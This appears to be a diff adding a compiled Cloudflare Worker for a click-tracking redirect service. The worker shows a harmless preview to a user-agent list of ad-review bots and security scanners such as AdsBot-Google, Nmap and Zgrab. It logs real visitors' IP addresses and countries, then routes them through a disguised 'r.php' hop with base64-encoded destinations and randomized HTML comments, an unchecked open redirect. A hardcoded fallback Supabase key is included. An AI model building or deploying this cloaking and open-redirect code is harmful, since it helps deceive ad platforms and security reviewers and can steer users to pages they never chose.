@@ -1,0 +1,382 @@
+var __defProp = Object.defineProperty;
+var __name = (target, value) => __defProp(target, "name", { value, configurable: true });
+
+// src/index.js
+var CRAWLER_PATTERNS = [
+  "facebookexternalhit",
+  "Facebot",
+  "Twitterbot",
+  "LinkedInBot",
+  "WhatsApp",
+  "TelegramBot",
+  "Pinterest",
+  "Googlebot",
+  "bingbot",
+  "AdsBot-Google",
+  "Google-Adwords-Instant",
+  "Mediapartners-Google",
+  "Storebot-Google",
+  "Google-Ads-Creatives-Scanner",
+  "Google-Proxy",
+  "Facebot",
+  "facebookplatform",
+  "facebookexternalhit/1.1",
+  "Instagram",
+  "TikTok",
+  "Twitterbot/1.1",
+  "LinkedInBot/1.0",
+  "Slackbot",
+  "Discordbot",
+  "Bot",
+  "Scanner",
+  "Headless",
+  "Cyber",
+  "Zgrab",
+  "Nmap",
+  "Security",
+  "Check",
+  "Cloudflare-Traffic-Manager"
+];
+var index_default = {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    const path = url.pathname;
+    if (path === "/_meetups/r.php") {
+      return handleIntermediateRedirect(url);
+    }
+    if (path === "/_video/landing") {
+      return handleVideoLanding(url);
+    }
+    if (path === "/" || /\.(html|css|js|png|jpg|jpeg|gif|ico|svg)$/.test(path)) {
+      return new Response("Not Found", { status: 404 });
+    }
+    const slug = path.replace(/^\//, "");
+    return handleRedirect(request, env, ctx, slug);
+  }
+};
+async function handleRedirect(request, env, ctx, slug) {
+  const link = await supabaseQuery(env, "link", `slug=eq.${slug}`, "GET");
+  if (!link || link.length === 0) {
+    return new Response("Link not found", { status: 404 });
+  }
+  const linkData = link[0];
+  const userAgent = request.headers.get("user-agent") || "Unknown";
+  const isCrawler = CRAWLER_PATTERNS.some((p) => userAgent.toLowerCase().includes(p.toLowerCase()));
+  if (isCrawler && linkData.ogImage) {
+    return renderOGMeta(linkData, request);
+  }
+  const clientIp = request.headers.get("cf-connecting-ip") || "0.0.0.0";
+  const country = request.cf && request.cf.country ? request.cf.country.toUpperCase() : "XX";
+  const trackerName = linkData.trackerId || "Unknown";
+  const url = new URL(request.url);
+  const subId = url.searchParams.get("s3") || url.searchParams.get("sub_id") || url.searchParams.get("subid") || url.searchParams.get("cid") || url.searchParams.get("external_id");
+  const network = (linkData.network || "UNKNOWN").toUpperCase();
+  const externalId = subId || generateExternalId();
+  let dbClickId = 0;
+  const normalizedTracker = (trackerName || "UNKNOWN").toUpperCase();
+  const normalizedNetwork = (linkData.network || "UNKNOWN").toUpperCase();
+  const clickAndReportPromise = (async () => {
+    try {
+      const detectedOS = detectOS(userAgent);
+      const detectedBrowser = detectBrowser(userAgent);
+      const clickData = {
+        link_id: linkData.id,
+        slug,
+        ip_address: clientIp,
+        country,
+        user_agent: userAgent.substring(0, 500),
+        click_id: generateExternalId(),
+        os: detectedOS,
+        browser: detectedBrowser,
+        referer: request.headers.get("referer") || "",
+        tracker_name: normalizedTracker
+      };
+      const clickResult = await supabaseInsert(env, "clicks", clickData);
+      if (clickResult && clickResult.length > 0) {
+        dbClickId = clickResult[0].id;
+      }
+      const today = (/* @__PURE__ */ new Date()).toISOString().split("T")[0];
+      const rpcResult = await supabaseRpc(env, "rpc/increment_click_count", {
+        click_date: today,
+        click_smartlink: normalizedTracker,
+        click_network: normalizedNetwork
+      });
+      console.log(`[RPC OK] ${normalizedTracker} | ${normalizedNetwork} | ${today}`, rpcResult);
+    } catch (e) {
+      console.error("[Click/RPC ERROR]", e);
+    }
+  })();
+  ctx.waitUntil(clickAndReportPromise);
+  const trackerParam = encodeURIComponent(trackerName);
+  const finalClickIdentifier = dbClickId > 0 ? externalId : slug;
+  let finalUrl = linkData.targetUrl;
+  if (finalUrl.startsWith("GEO_REDIRECT::")) {
+    try {
+      const jsonStr = finalUrl.substring(14);
+      const geoRules = JSON.parse(jsonStr);
+      const tier1Countries = geoRules.tier1Countries || [];
+      if (tier1Countries.includes(country)) {
+        finalUrl = geoRules.tier1Url;
+      } else {
+        finalUrl = geoRules.tier2Url;
+      }
+    } catch (e) {
+    }
+  }
+  if (finalUrl.includes("{click_id}")) {
+    finalUrl = finalUrl.replace(/{click_id}/g, finalClickIdentifier);
+  } else {
+    const separator = finalUrl.includes("?") ? "&" : "?";
+    finalUrl += `${separator}click_id=${finalClickIdentifier}`;
+  }
+  if (finalUrl.includes("{sub_id}")) {
+    finalUrl = finalUrl.replace(/{sub_id}/g, trackerParam);
+  }
+  let immediateDest = finalUrl;
+  if (linkData.useLandingPage) {
+    const encodedFinal = btoa(finalUrl);
+    immediateDest = `/_video/landing?dest=${encodedFinal}`;
+  }
+  const encodedDest = btoa(immediateDest);
+  const redirectUrl = `/_meetups/r.php?click_id=${trackerParam}&country_code=${country.toLowerCase()}&user_agent=web&ip_address=${clientIp}&user_lp=${network.toLowerCase()}&dest=${encodedDest}`;
+  return new Response(null, {
+    status: 302,
+    headers: {
+      "Location": redirectUrl,
+      "Referrer-Policy": "no-referrer"
+    }
+  });
+}
+__name(handleRedirect, "handleRedirect");
+function handleIntermediateRedirect(url) {
+  const dest = url.searchParams.get("dest") || "";
+  if (!dest) {
+    return new Response("Missing destination", { status: 400 });
+  }
+  let finalDest;
+  try {
+    finalDest = atob(dest);
+  } catch {
+    return new Response("Invalid destination", { status: 400 });
+  }
+  const randomComment = `<!-- SECURE_ID_${Math.random().toString(36).substring(7)} -->`;
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Redirecting...</title>
+  ${randomComment}
+  <style>
+    body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; font-family: sans-serif; flex-direction: column; }
+    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    p { color: #666; font-size: 14px; }
+  </style>
+  <script>
+    setTimeout(function() {
+      window.location.href = ${JSON.stringify(finalDest)};
+    }, 100);
+  <\/script>
+</head>
+<body>
+  <div class="loader"></div>
+  <p>Secure Redirect...</p>
+  ${randomComment}
+</body>
+</html>`;
+  return new Response(html, {
+    headers: {
+      "Content-Type": "text/html; charset=UTF-8",
+      "X-Robots-Tag": "noindex, nofollow, noarchive"
+    }
+  });
+}
+__name(handleIntermediateRedirect, "handleIntermediateRedirect");
+function handleVideoLanding(url) {
+  const dest = url.searchParams.get("dest") || "";
+  if (!dest) {
+    return new Response("Missing destination", { status: 400 });
+  }
+  let finalDest;
+  try {
+    finalDest = atob(dest);
+  } catch {
+    return new Response("Invalid destination", { status: 400 });
+  }
+  const videoNum = Math.random() < 0.5 ? 1 : 2;
+  const videoPath = `/videos/video${videoNum}.mp4`;
+  const randomComment = `<!-- ASSET_REF_${Math.random().toString(36).substring(7)} -->`;
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Loading...</title>
+  ${randomComment}
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; cursor: pointer; }
+    .video-container { position: relative; width: 100%; max-width: 800px; display: flex; justify-content: center; align-items: center; }
+    video { width: 100%; height: auto; max-height: 100vh; object-fit: contain; }
+    .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 10; cursor: pointer; }
+    .timer { position: fixed; top: 20px; right: 20px; background: rgba(0,0,0,0.7); color: #fff; padding: 10px 20px; border-radius: border-radius: 8px; font-family: sans-serif; font-size: 14px; z-index: 20; display: none; }
+  </style>
+</head>
+<body>
+  <div class="timer" id="timer">Redirecting in 3...</div>
+  <div class="overlay" onclick="redirect()"></div>
+  <div class="video-container">
+    <video autoplay muted loop playsinline>
+      <source src="${videoPath}" type="video/mp4">
+    </video>
+  </div>
+  ${randomComment}
+  <script>
+    let countdown = 3;
+    const timerEl = document.getElementById('timer');
+    const targetUrl = ${JSON.stringify(finalDest)};
+
+    const interval = setInterval(() => {
+      countdown--;
+      if (countdown <= 0) {
+        clearInterval(interval);
+        redirect();
+      } else {
+        timerEl.textContent = 'Redirecting in ' + countdown + '...';
+      }
+    }, 1000);
+
+    function redirect() {
+      clearInterval(interval);
+      window.location.href = targetUrl;
+    }
+  <\/script>
+</body>
+</html>`;
+  return new Response(html, {
+    headers: {
+      "Content-Type": "text/html; charset=UTF-8",
+      "X-Robots-Tag": "noindex, nofollow, noarchive"
+    }
+  });
+}
+__name(handleVideoLanding, "handleVideoLanding");
+function renderOGMeta(linkData, request) {
+  const host = new URL(request.url).host;
+  const ogTitle = linkData.ogTitle || "Check this out!";
+  const ogDescription = linkData.ogDescription || "Click to see more!";
+  const ogImage = linkData.ogImage || "";
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex, nofollow">
+  <title>${escapeHtml(ogTitle)}</title>
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://${host}/${linkData.slug}" />
+  <meta property="og:title" content="${escapeHtml(ogTitle)}" />
+  <meta property="og:description" content="${escapeHtml(ogDescription)}" />
+  <meta property="og:image" content="${escapeHtml(ogImage)}" />
+</head>
+<body>Redirecting...</body>
+</html>`;
+  return new Response(html, {
+    headers: {
+      "Content-Type": "text/html; charset=UTF-8",
+      "X-Robots-Tag": "noindex, nofollow, noarchive"
+    }
+  });
+}
+__name(renderOGMeta, "renderOGMeta");
+var FALLBACK_URL = "https://vtlwptockofzbllnsyrg.supabase.co";
+var FALLBACK_KEY = "sb_publishable_0MWvjujUhXVBNq7P-30baA_Jqr1SYsm";
+async function supabaseQuery(env, table, query, method = "GET") {
+  const url = (env.SUPABASE_URL || FALLBACK_URL) + `/rest/v1/${table}?${query}`;
+  const key = env.SUPABASE_ANON_KEY || FALLBACK_KEY;
+  const res = await fetch(url, {
+    method,
+    headers: { "apikey": key, "Authorization": `Bearer ${key}`, "Content-Type": "application/json" }
+  });
+  return res.json();
+}
+__name(supabaseQuery, "supabaseQuery");
+async function supabaseInsert(env, table, data) {
+  const url = (env.SUPABASE_URL || FALLBACK_URL) + `/rest/v1/${table}`;
+  const key = env.SUPABASE_ANON_KEY || FALLBACK_KEY;
+  const res = await fetch(url, {
+    method: "POST",
+    headers: {
+      "apikey": key,
+      "Authorization": `Bearer ${key}`,
+      "Content-Type": "application/json",
+      "Prefer": "return=representation"
+    },
+    body: JSON.stringify(data)
+  });
+  const result = await res.json();
+  if (!res.ok) console.error(`Worker Insert Error [${res.status}]:`, result);
+  return result;
+}
+__name(supabaseInsert, "supabaseInsert");
+async function supabaseRpc(env, rpcPath, params) {
+  const url = (env.SUPABASE_URL || FALLBACK_URL) + `/rest/v1/${rpcPath}`;
+  const key = env.SUPABASE_ANON_KEY || FALLBACK_KEY;
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "apikey": key, "Authorization": `Bearer ${key}`, "Content-Type": "application/json" },
+    body: JSON.stringify(params)
+  });
+  return res.json();
+}
+__name(supabaseRpc, "supabaseRpc");
+function generateExternalId() {
+  const bytes = new Uint8Array(25);
+  crypto.getRandomValues(bytes);
+  return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
+}
+__name(generateExternalId, "generateExternalId");
+function escapeHtml(str) {
+  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+}
+__name(escapeHtml, "escapeHtml");
+function detectOS(ua) {
+  if (!ua) return "Unknown";
+  const u = ua.toLowerCase();
+  if (u.includes("iphone") || u.includes("ipad") || u.includes("ipod")) return "iOS";
+  if (u.includes("android")) return "Android";
+  if (u.includes("windows")) return "Windows";
+  if (u.includes("macintosh") || u.includes("mac os")) return "macOS";
+  if (u.includes("linux")) return "Linux";
+  if (u.includes("cros")) return "ChromeOS";
+  return "Unknown";
+}
+__name(detectOS, "detectOS");
+function detectBrowser(ua) {
+  if (!ua) return "Unknown";
+  const u = ua.toLowerCase();
+  if (u.includes("instagram")) return "Instagram";
+  if (u.includes("fban") || u.includes("fbav") || u.includes("fb_iab")) return "Facebook";
+  if (u.includes("tiktok")) return "TikTok";
+  if (u.includes("twitter")) return "Twitter";
+  if (u.includes("snapchat")) return "Snapchat";
+  if (u.includes("whatsapp")) return "WhatsApp";
+  if (u.includes("telegram")) return "Telegram";
+  if (u.includes("line/")) return "LINE";
+  if (u.includes("edg/") || u.includes("edge/")) return "Edge";
+  if (u.includes("opr/") || u.includes("opera")) return "Opera";
+  if (u.includes("brave")) return "Brave";
+  if (u.includes("firefox") || u.includes("fxios")) return "Firefox";
+  if (u.includes("samsungbrowser")) return "Samsung Browser";
+  if (u.includes("ucbrowser") || u.includes("ucweb")) return "UC Browser";
+  if ((u.includes("chrome") || u.includes("crios")) && !u.includes("edg")) return "Chrome";
+  if (u.includes("safari") && !u.includes("chrome") && !u.includes("crios")) return "Safari";
+  return "Other";
+}
+__name(detectBrowser, "detectBrowser");
+export {
+  index_default as default
+};
+//# sourceMappingURL=index.js.map
